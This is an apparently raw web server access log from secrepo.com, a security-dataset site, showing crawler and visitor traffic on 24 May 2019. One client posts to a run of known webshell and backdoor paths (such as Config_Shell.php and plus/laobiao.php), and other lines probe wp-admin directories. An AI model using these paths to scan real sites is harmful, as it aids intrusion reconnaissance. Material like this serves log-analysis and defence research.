192.185.82.130 - - [24/May/2019:01:53:47 -0700] "GET /wp/wp-admin/ HTTP/1.1" 301 485 "-" "-" 
149.56.44.141 - - [24/May/2019:02:00:32 -0700] "GET /old/wp-admin/ HTTP/1.1" 301 487 "-" "-" 
157.55.39.136 - - [24/May/2019:02:05:39 -0700] "GET /self.logs/access.log.2017-08-09.gz HTTP/1.1" 200 26665 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.165 - - [24/May/2019:02:06:46 -0700] "GET /self.logs/access.log.2019-02-01.gz HTTP/1.1" 200 21821 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
62.218.164.126 - - [24/May/2019:02:08:09 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
62.218.164.126 - - [24/May/2019:02:08:09 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
62.218.164.126 - - [24/May/2019:02:08:09 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
45.32.24.78 - - [24/May/2019:02:08:43 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
45.32.24.78 - - [24/May/2019:02:08:44 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
45.32.24.78 - - [24/May/2019:02:08:45 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27751 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
45.32.24.78 - - [24/May/2019:02:08:46 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7391 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
45.32.24.78 - - [24/May/2019:02:08:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 553 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
31.13.127.9 - - [24/May/2019:02:14:26 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "cortex/1.0" 
31.13.127.29 - - [24/May/2019:02:14:27 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "cortex/1.0" 
103.214.60.148 - - [24/May/2019:02:14:47 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.214.60.148 - - [24/May/2019:02:14:48 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.214.60.148 - - [24/May/2019:02:14:48 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.214.60.148 - - [24/May/2019:02:14:53 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.214.60.148 - - [24/May/2019:02:15:14 -0700] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 127595 "http://www.secrepo.com/maccdc2012/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.214.60.148 - - [24/May/2019:02:15:15 -0700] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 206 53930 "http://www.secrepo.com/maccdc2012/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.214.60.148 - - [24/May/2019:02:15:28 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 44811 "http://www.secrepo.com/maccdc2012/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.214.60.148 - - [24/May/2019:02:15:29 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 206 12559 "http://www.secrepo.com/maccdc2012/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
145.136.144.82 - - [24/May/2019:02:16:53 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
145.136.144.82 - - [24/May/2019:02:16:53 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
116.255.154.84 - - [24/May/2019:02:20:19 -0700] "POST //Config_Shell.php HTTP/1.1" 404 295 "http://www.secrepo.com//Config_Shell.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:20 -0700] "POST //fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com//fdgq.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:20 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 294 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:20 -0700] "POST //plus/laobiao.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/laobiao.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:20 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:21 -0700] "POST //plus/lucas.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/lucas.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:21 -0700] "POST //plus/read.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:21 -0700] "POST //data/cache/flye.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:21 -0700] "POST //plus/mybak.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mybak.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:22 -0700] "POST //lx.php HTTP/1.1" 404 294 "http://www.secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.154.84 - - [24/May/2019:02:20:22 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
157.55.39.134 - - [24/May/2019:02:28:40 -0700] "GET /self.logs/error.log.2018-07-31.gz HTTP/1.1" 200 9126 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.165 - - [24/May/2019:02:31:12 -0700] "GET /self.logs/2015/error.log.2015-03-01.gz HTTP/1.1" 200 922 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
213.174.152.181 - - [24/May/2019:02:32:36 -0700] "GET /robots.txt HTTP/1.1" 301 462 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.181 - - [24/May/2019:02:32:39 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
41.223.160.131 - - [24/May/2019:02:36:13 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.165 - - [24/May/2019:02:36:15 -0700] "GET /self.logs/2015/error.log.2015-06-14.gz HTTP/1.1" 200 923 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
72.234.132.176 - - [24/May/2019:02:38:24 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
72.234.132.176 - - [24/May/2019:02:38:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
72.234.132.176 - - [24/May/2019:02:38:24 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
72.234.132.176 - - [24/May/2019:02:38:25 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.244.66.245 - - [24/May/2019:02:38:59 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
72.234.132.176 - - [24/May/2019:02:40:10 -0700] "GET /browserconfig.xml HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
41.223.160.131 - - [24/May/2019:02:40:19 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
62.218.164.126 - - [24/May/2019:02:47:27 -0700] "GET /pe_static/zeus.zip HTTP/1.1" 200 36464960 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
62.218.164.126 - - [24/May/2019:02:47:42 -0700] "GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1" 200 1592 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
62.218.164.126 - - [24/May/2019:02:47:42 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
193.146.109.44 - - [24/May/2019:02:51:14 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
193.146.109.44 - - [24/May/2019:02:51:14 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
193.146.109.44 - - [24/May/2019:02:51:14 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
193.146.109.44 - - [24/May/2019:02:51:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
193.146.109.44 - - [24/May/2019:02:51:15 -0700] "GET / HTTP/1.1" 200 12510 "-" "\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\"" 
193.146.109.44 - - [24/May/2019:02:51:15 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
193.146.109.44 - - [24/May/2019:02:51:15 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
193.146.109.44 - - [24/May/2019:02:51:15 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
216.244.66.245 - - [24/May/2019:02:52:52 -0700] "GET /self.logs/error.log.2019-02-05.gz HTTP/1.1" 200 3718 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
113.171.224.176 - - [24/May/2019:02:53:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
52.21.76.65 - - [24/May/2019:03:00:06 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 553 "-" "Embedly +support@embed.ly" 
141.196.202.19 - - [24/May/2019:03:00:06 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
141.196.202.19 - - [24/May/2019:03:00:07 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
141.196.202.19 - - [24/May/2019:03:00:06 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
141.196.202.19 - - [24/May/2019:03:00:07 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
216.244.66.245 - - [24/May/2019:03:23:56 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
157.55.39.134 - - [24/May/2019:03:24:50 -0700] "GET /self.logs/error.log.2019-03-06.gz HTTP/1.1" 200 5139 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
103.22.174.220 - - [24/May/2019:03:27:54 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.22.174.220 - - [24/May/2019:03:27:55 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27732 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.22.174.220 - - [24/May/2019:03:27:55 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
103.22.174.220 - - [24/May/2019:03:27:56 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 534 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
123.126.113.93 - - [24/May/2019:03:33:14 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
216.244.66.245 - - [24/May/2019:03:33:56 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 11881480 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
199.58.86.211 - - [24/May/2019:03:34:31 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [24/May/2019:03:34:33 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
216.244.66.245 - - [24/May/2019:03:35:28 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 615513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
162.210.196.98 - - [24/May/2019:03:41:43 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [24/May/2019:03:41:43 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [24/May/2019:03:41:45 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [24/May/2019:03:41:47 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
40.77.167.156 - - [24/May/2019:03:42:34 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/dhcp.html HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
128.39.168.201 - - [24/May/2019:03:47:18 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
128.39.168.201 - - [24/May/2019:03:47:18 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
128.39.168.201 - - [24/May/2019:03:47:18 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
128.39.168.201 - - [24/May/2019:03:47:19 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
95.217.0.200 - - [24/May/2019:03:50:19 -0700] "GET / HTTP/1.1" 200 46413 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" 
157.55.39.134 - - [24/May/2019:03:51:22 -0700] "GET /self.logs/error.log.2019-03-20.gz HTTP/1.1" 200 8649 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.134 - - [24/May/2019:03:52:09 -0700] "GET /self.logs/2015/access.log.2015-10-01.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.165 - - [24/May/2019:03:53:43 -0700] "GET /self.logs/2016/error.log.2016-03-07.gz HTTP/1.1" 200 764 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [24/May/2019:03:56:23 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
115.156.152.19 - - [24/May/2019:03:57:53 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
157.55.39.134 - - [24/May/2019:04:02:58 -0700] "GET /self.logs/error.log.2018-08-26.gz HTTP/1.1" 200 6495 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.134 - - [24/May/2019:04:04:04 -0700] "GET /self.logs/error.log.2017-06-26.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
86.57.253.251 - - [24/May/2019:04:08:35 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" 
86.57.253.251 - - [24/May/2019:04:08:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 65866 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" 
86.57.253.251 - - [24/May/2019:04:08:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 34291 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" 
86.57.253.251 - - [24/May/2019:04:08:34 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" 
86.57.253.251 - - [24/May/2019:04:08:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 65874 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" 
86.57.253.251 - - [24/May/2019:04:08:36 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 131411 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" 
216.244.66.245 - - [24/May/2019:04:09:13 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
157.55.39.165 - - [24/May/2019:04:15:45 -0700] "GET /self.logs/access.log.2018-08-30.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
141.196.202.19 - - [24/May/2019:04:20:35 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
216.244.66.245 - - [24/May/2019:04:23:25 -0700] "GET /self.logs/error.log.2019-02-07.gz HTTP/1.1" 200 3549 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
180.97.190.227 - - [24/May/2019:04:30:57 -0700] "GET / HTTP/1.1" 200 12511 "-" "python-requests/2.20.1" 
180.97.190.227 - - [24/May/2019:04:30:58 -0700] "GET / HTTP/1.1" 200 12511 "-" "newspaper/0.2.8" 
157.55.39.165 - - [24/May/2019:04:33:07 -0700] "GET /self.logs/access.log.2017-05-13.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
180.97.190.227 - - [24/May/2019:04:34:24 -0700] "GET / HTTP/1.1" 200 12511 "-" "python-requests/2.20.1" 
109.201.154.135 - - [24/May/2019:04:43:11 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)" 
109.201.154.135 - - [24/May/2019:04:43:13 -0700] "HEAD / HTTP/1.1" 200 284 "https://uptime.com/www.secrepo.com" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)" 
82.158.177.101 - - [24/May/2019:04:43:16 -0700] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
157.55.39.136 - - [24/May/2019:04:47:38 -0700] "GET /self.logs/2016/access.log.2016-06-25.gz HTTP/1.1" 200 5809 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.136 - - [24/May/2019:04:50:10 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 301 515 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.136 - - [24/May/2019:04:50:15 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
105.187.167.14 - - [24/May/2019:04:55:24 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
105.187.167.14 - - [24/May/2019:04:55:25 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
105.187.167.14 - - [24/May/2019:04:55:25 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
105.187.167.14 - - [24/May/2019:04:55:25 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
105.187.167.14 - - [24/May/2019:04:58:53 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
105.187.167.14 - - [24/May/2019:04:58:54 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
105.187.167.14 - - [24/May/2019:04:58:54 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
105.187.167.14 - - [24/May/2019:04:58:55 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
113.171.224.176 - - [24/May/2019:05:02:14 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.224 - - [24/May/2019:05:03:40 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
37.70.200.3 - - [24/May/2019:05:05:31 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
37.70.200.3 - - [24/May/2019:05:05:31 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
157.55.39.136 - - [24/May/2019:05:05:56 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.136 - - [24/May/2019:05:08:52 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
